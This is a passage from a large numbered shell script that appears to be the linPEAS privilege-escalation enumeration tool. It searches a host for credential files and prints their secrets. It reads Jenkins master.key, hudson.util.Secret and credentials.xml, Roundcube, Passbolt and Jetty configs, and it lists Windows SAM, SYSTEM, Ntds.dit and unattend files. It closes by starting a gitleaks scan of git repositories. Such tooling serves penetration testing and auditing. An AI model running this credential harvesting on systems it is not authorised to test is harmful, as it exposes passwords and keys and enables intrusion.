"database_pw|database_user|database_pass|database_type|database_default|detabase_hostname|database_port|database_ssl" | sed -${E} "s,database_pw.*|database_user.*|database_pass.*,${SED_RED},g"; done; echo "";done; echo "";
  4544	fi
  4545	
  4546	
  4547	if [ "$PSTORAGE_ROUNDCUBE" ] || [ "$DEBUG" ]; then
  4548	  print_2title "Analyzing Roundcube Files (limit 70)"
  4549	    if ! [ "`echo \"$PSTORAGE_ROUNDCUBE\" | grep -E \"roundcube$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "roundcube"; fi; fi; printf "%s" "$PSTORAGE_ROUNDCUBE" | grep -E "roundcube$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,roundcube$,${SED_RED},"; find "$f" -name "config.inc.php" | while read ff; do ls -ld "$ff" | sed -${E} "s,config.inc.php,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -E "config\[" | sed -${E} "s,db_dsnw,${SED_RED},g"; done; echo "";done; echo "";
  4550	fi
  4551	
  4552	
  4553	if [ "$PSTORAGE_PASSBOLT" ] || [ "$DEBUG" ]; then
  4554	  print_2title "Analyzing Passbolt Files (limit 70)"
  4555	    if ! [ "`echo \"$PSTORAGE_PASSBOLT\" | grep -E \"passbolt\.php$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "passbolt.php"; fi; fi; printf "%s" "$PSTORAGE_PASSBOLT" | grep -E "passbolt\.php$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,passbolt\.php$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "host|port|username|password|database" | grep -Ev "^#" | sed -${E} "s,[pP][aA][sS][sS].*|[uU][sS][eE][rR].*,${SED_RED},g"; done; echo "";
  4556	fi
  4557	
  4558	
  4559	if [ "$PSTORAGE_JETTY" ] || [ "$DEBUG" ]; then
  4560	  print_2title "Analyzing Jetty Files (limit 70)"
  4561	    if ! [ "`echo \"$PSTORAGE_JETTY\" | grep -E \"jetty-realm\.properties$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "jetty-realm.properties"; fi; fi; printf "%s" "$PSTORAGE_JETTY" | grep -E "jetty-realm\.properties$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,jetty-realm\.properties$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
  4562	fi
  4563	
  4564	
  4565	if [ "$PSTORAGE_JENKINS" ] || [ "$DEBUG" ]; then
  4566	  print_2title "Analyzing Jenkins Files (limit 70)"
  4567	    if ! [ "`echo \"$PSTORAGE_JENKINS\" | grep -E \"master\.key$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "master.key"; fi; fi; printf "%s" "$PSTORAGE_JENKINS" | grep -E "master\.key$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,master\.key$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
  4568	    if ! [ "`echo \"$PSTORAGE_JENKINS\" | grep -E \"hudson\.util\.Secret$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "hudson.util.Secret"; fi; fi; printf "%s" "$PSTORAGE_JENKINS" | grep -E "hudson\.util\.Secret$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,hudson\.util\.Secret$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
  4569	    if ! [ "`echo \"$PSTORAGE_JENKINS\" | grep -E \"credentials\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "credentials.xml"; fi; fi; printf "%s" "$PSTORAGE_JENKINS" | grep -E "credentials\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,credentials\.xml$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,secret.*|password.*,${SED_RED},g"; done; echo "";
  4570	    if ! [ "`echo \"$PSTORAGE_JENKINS\" | grep -E \"config\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "config.xml"; fi; fi; printf "%s" "$PSTORAGE_JENKINS" | grep -E "config\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,config\.xml$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "secret.*|password.*" | sed -${E} "s,secret.*|password.*,${SED_RED},g"; done; echo "";
  4571	    if ! [ "`echo \"$PSTORAGE_JENKINS\" | grep -E \"jenkins$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*jenkins"; fi; fi; printf "%s" "$PSTORAGE_JENKINS" | grep -E "jenkins$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,jenkins$,${SED_RED},"; find "$f" -name "build.xml" | while read ff; do ls -ld "$ff" | sed -${E} "s,build.xml,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -E "secret.*|password.*" | sed -${E} "s,secret.*|password.*,${SED_RED},g"; done; echo "";done; echo "";
  4572	fi
  4573	
  4574	
  4575	
  4576	
  4577	if [ "$PSTORAGE_INTERESTING_LOGS" ] || [ "$DEBUG" ]; then
  4578	  print_2title "Analyzing Interesting logs Files (limit 70)"
  4579	    if ! [ "`echo \"$PSTORAGE_INTERESTING_LOGS\" | grep -E \"access\.log$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "access.log"; fi; fi; printf "%s" "$PSTORAGE_INTERESTING_LOGS" | grep -E "access\.log$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,access\.log$,${SED_RED},"; done; echo "";
  4580	    if ! [ "`echo \"$PSTORAGE_INTERESTING_LOGS\" | grep -E \"error\.log$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "error.log"; fi; fi; printf "%s" "$PSTORAGE_INTERESTING_LOGS" | grep -E "error\.log$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,error\.log$,${SED_RED},"; done; echo "";
  4581	fi
  4582	
  4583	
  4584	if [ "$PSTORAGE_WINDOWS" ] || [ "$DEBUG" ]; then
  4585	  print_2title "Analyzing Windows Files (limit 70)"
  4586	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"\.rdg$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.rdg"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "\.rdg$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.rdg$,${SED_RED},"; done; echo "";
  4587	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"AppEvent\.Evt$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "AppEvent.Evt"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "AppEvent\.Evt$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,AppEvent\.Evt$,${SED_RED},"; done; echo "";
  4588	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"autounattend\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "autounattend.xml"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "autounattend\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,autounattend\.xml$,${SED_RED},"; done; echo "";
  4589	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"ConsoleHost_history\.txt$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "ConsoleHost_history.txt"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "ConsoleHost_history\.txt$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,ConsoleHost_history\.txt$,${SED_RED},"; done; echo "";
  4590	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"FreeSSHDservice\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "FreeSSHDservice.ini"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "FreeSSHDservice\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,FreeSSHDservice\.ini$,${SED_RED},"; done; echo "";
  4591	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"NetSetup\.log$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "NetSetup.log"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "NetSetup\.log$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,NetSetup\.log$,${SED_RED},"; done; echo "";
  4592	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"Ntds\.dit$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "Ntds.dit"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "Ntds\.dit$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,Ntds\.dit$,${SED_RED},"; done; echo "";
  4593	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"protecteduserkey\.bin$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "protecteduserkey.bin"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "protecteduserkey\.bin$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,protecteduserkey\.bin$,${SED_RED},"; done; echo "";
  4594	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"RDCMan\.settings$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "RDCMan.settings"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "RDCMan\.settings$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,RDCMan\.settings$,${SED_RED},"; done; echo "";
  4595	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"SAM$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "SAM"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "SAM$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,SAM$,${SED_RED},"; done; echo "";
  4596	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"SYSTEM$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "SYSTEM"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "SYSTEM$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,SYSTEM$,${SED_RED},"; done; echo "";
  4597	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"SecEvent\.Evt$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "SecEvent.Evt"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "SecEvent\.Evt$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,SecEvent\.Evt$,${SED_RED},"; done; echo "";
  4598	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"appcmd\.exe$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "appcmd.exe"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "appcmd\.exe$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,appcmd\.exe$,${SED_RED},"; done; echo "";
  4599	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"bash\.exe$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "bash.exe"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "bash\.exe$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,bash\.exe$,${SED_RED},"; done; echo "";
  4600	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"datasources\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "datasources.xml"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "datasources\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,datasources\.xml$,${SED_RED},"; done; echo "";
  4601	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"default\.sav$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "default.sav"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "default\.sav$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,default\.sav$,${SED_RED},"; done; echo "";
  4602	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"drives\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "drives.xml"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "drives\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,drives\.xml$,${SED_RED},"; done; echo "";
  4603	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"groups\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "groups.xml"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "groups\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,groups\.xml$,${SED_RED},"; done; echo "";
  4604	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"https-xampp\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "https-xampp.conf"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "https-xampp\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,https-xampp\.conf$,${SED_RED},"; done; echo "";
  4605	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"https\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "https.conf"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "https\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,https\.conf$,${SED_RED},"; done; echo "";
  4606	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"iis6\.log$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "iis6.log"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "iis6\.log$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,iis6\.log$,${SED_RED},"; done; echo "";
  4607	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"index\.dat$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "index.dat"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "index\.dat$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,index\.dat$,${SED_RED},"; done; echo "";
  4608	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"my\.cnf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "my.cnf"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "my\.cnf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,my\.cnf$,${SED_RED},"; done; echo "";
  4609	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"my\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "my.ini"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "my\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,my\.ini$,${SED_RED},"; done; echo "";
  4610	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"ntuser\.dat$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "ntuser.dat"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "ntuser\.dat$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,ntuser\.dat$,${SED_RED},"; done; echo "";
  4611	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"pagefile\.sys$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "pagefile.sys"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "pagefile\.sys$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,pagefile\.sys$,${SED_RED},"; done; echo "";
  4612	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"printers\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "printers.xml"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "printers\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,printers\.xml$,${SED_RED},"; done; echo "";
  4613	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"recentservers\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "recentservers.xml"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "recentservers\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,recentservers\.xml$,${SED_RED},"; done; echo "";
  4614	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"scclient\.exe$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "scclient.exe"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "scclient\.exe$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,scclient\.exe$,${SED_RED},"; done; echo "";
  4615	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"scheduledtasks\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "scheduledtasks.xml"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "scheduledtasks\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,scheduledtasks\.xml$,${SED_RED},"; done; echo "";
  4616	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"security\.sav$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "security.sav"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "security\.sav$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,security\.sav$,${SED_RED},"; done; echo "";
  4617	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"server\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "server.xml"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "server\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,server\.xml$,${SED_RED},"; done; echo "";
  4618	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"setupinfo$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "setupinfo"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "setupinfo$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,setupinfo$,${SED_RED},"; done; echo "";
  4619	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"setupinfo\.bak$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "setupinfo.bak"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "setupinfo\.bak$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,setupinfo\.bak$,${SED_RED},"; done; echo "";
  4620	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"sitemanager\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "sitemanager.xml"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "sitemanager\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,sitemanager\.xml$,${SED_RED},"; done; echo "";
  4621	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"sites\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "sites.ini"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "sites\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,sites\.ini$,${SED_RED},"; done; echo "";
  4622	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"software$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "software"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "software$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,software$,${SED_RED},"; done; echo "";
  4623	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"software\.sav$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "software.sav"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "software\.sav$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,software\.sav$,${SED_RED},"; done; echo "";
  4624	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"sysprep\.inf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "sysprep.inf"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "sysprep\.inf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,sysprep\.inf$,${SED_RED},"; done; echo "";
  4625	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"sysprep\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "sysprep.xml"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "sysprep\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,sysprep\.xml$,${SED_RED},"; done; echo "";
  4626	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"system\.sav$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "system.sav"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "system\.sav$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,system\.sav$,${SED_RED},"; done; echo "";
  4627	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"unattend\.inf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "unattend.inf"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "unattend\.inf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,unattend\.inf$,${SED_RED},"; done; echo "";
  4628	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"unattend\.txt$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "unattend.txt"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "unattend\.txt$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,unattend\.txt$,${SED_RED},"; done; echo "";
  4629	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"unattend\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "unattend.xml"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "unattend\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,unattend\.xml$,${SED_RED},"; done; echo "";
  4630	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"unattended\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "unattended.xml"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "unattended\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,unattended\.xml$,${SED_RED},"; done; echo "";
  4631	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"wcx_ftp\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "wcx_ftp.ini"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "wcx_ftp\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,wcx_ftp\.ini$,${SED_RED},"; done; echo "";
  4632	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"ws_ftp\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "ws_ftp.ini"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "ws_ftp\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,ws_ftp\.ini$,${SED_RED},"; done; echo "";
  4633	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"web.*\.config$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "web*.config"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "web.*\.config$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,web.*\.config$,${SED_RED},"; done; echo "";
  4634	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"winscp\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "winscp.ini"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "winscp\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,winscp\.ini$,${SED_RED},"; done; echo "";
  4635	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"wsl\.exe$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "wsl.exe"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "wsl\.exe$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,wsl\.exe$,${SED_RED},"; done; echo "";
  4636	    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"plum\.sqlite$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "plum.sqlite"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "plum\.sqlite$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,plum\.sqlite$,${SED_RED},"; done; echo "";
  4637	fi
  4638	
  4639	
  4640	if [ "$PSTORAGE_OTHER_INTERESTING" ] || [ "$DEBUG" ]; then
  4641	  print_2title "Analyzing Other Interesting Files (limit 70)"
  4642	    if ! [ "`echo \"$PSTORAGE_OTHER_INTERESTING\" | grep -E \"\.bashrc$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".bashrc"; fi; fi; printf "%s" "$PSTORAGE_OTHER_INTERESTING" | grep -E "\.bashrc$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.bashrc$,${SED_RED},"; done; echo "";
  4643	    if ! [ "`echo \"$PSTORAGE_OTHER_INTERESTING\" | grep -E \"\.google_authenticator$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".google_authenticator"; fi; fi; printf "%s" "$PSTORAGE_OTHER_INTERESTING" | grep -E "\.google_authenticator$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.google_authenticator$,${SED_RED},"; done; echo "";
  4644	    if ! [ "`echo \"$PSTORAGE_OTHER_INTERESTING\" | grep -E \"hosts\.equiv$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "hosts.equiv"; fi; fi; printf "%s" "$PSTORAGE_OTHER_INTERESTING" | grep -E "hosts\.equiv$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,hosts\.equiv$,${SED_RED},"; done; echo "";
  4645	    if ! [ "`echo \"$PSTORAGE_OTHER_INTERESTING\" | grep -E \"\.lesshst$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".lesshst"; fi; fi; printf "%s" "$PSTORAGE_OTHER_INTERESTING" | grep -E "\.lesshst$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.lesshst$,${SED_RED},"; done; echo "";
  4646	    if ! [ "`echo \"$PSTORAGE_OTHER_INTERESTING\" | grep -E \"\.plan$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".plan"; fi; fi; printf "%s" "$PSTORAGE_OTHER_INTERESTING" | grep -E "\.plan$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.plan$,${SED_RED},"; done; echo "";
  4647	    if ! [ "`echo \"$PSTORAGE_OTHER_INTERESTING\" | grep -E \"\.profile$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".profile"; fi; fi; printf "%s" "$PSTORAGE_OTHER_INTERESTING" | grep -E "\.profile$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.profile$,${SED_RED},"; done; echo "";
  4648	    if ! [ "`echo \"$PSTORAGE_OTHER_INTERESTING\" | grep -E \"\.recently-used\.xbel$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".recently-used.xbel"; fi; fi; printf "%s" "$PSTORAGE_OTHER_INTERESTING" | grep -E "\.recently-used\.xbel$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.recently-used\.xbel$,${SED_RED},"; done; echo "";
  4649	    if ! [ "`echo \"$PSTORAGE_OTHER_INTERESTING\" | grep -E \"\.rhosts$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".rhosts"; fi; fi; printf "%s" "$PSTORAGE_OTHER_INTERESTING" | grep -E "\.rhosts$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.rhosts$,${SED_RED},"; done; echo "";
  4650	    if ! [ "`echo \"$PSTORAGE_OTHER_INTERESTING\" | grep -E \"\.sudo_as_admin_successful$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".sudo_as_admin_successful"; fi; fi; printf "%s" "$PSTORAGE_OTHER_INTERESTING" | grep -E "\.sudo_as_admin_successful$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.sudo_as_admin_successful$,${SED_RED},"; done; echo "";
  4651	fi
  4652	
  4653	
  4654	if ! [ "$FAST" ] && ! [ "$SUPERFAST" ] && [ "$TIMEOUT" ]; then
  4655	  print_2title "Checking leaks in git repositories"
  4656	  printf "%s\n" "$PSTORAGE_GITHUB" | while read f; do
  4657	    if echo "$f" | grep -Eq ".git$"; then
  4658	      git_dirname=$(dirname "$f")
  4659	      if [ "$MACPEAS" ]; then
  4660	        execBin "GitLeaks (checking $git_dirname)" "https://github.com/zricethezav/gitleaks" "$FAT_LINPEAS_GITLEAKS_MACOS" "detect -s '$git_dirname' -v | grep -E 'Description|Match|Secret|Message|Date'"
  4661	      else
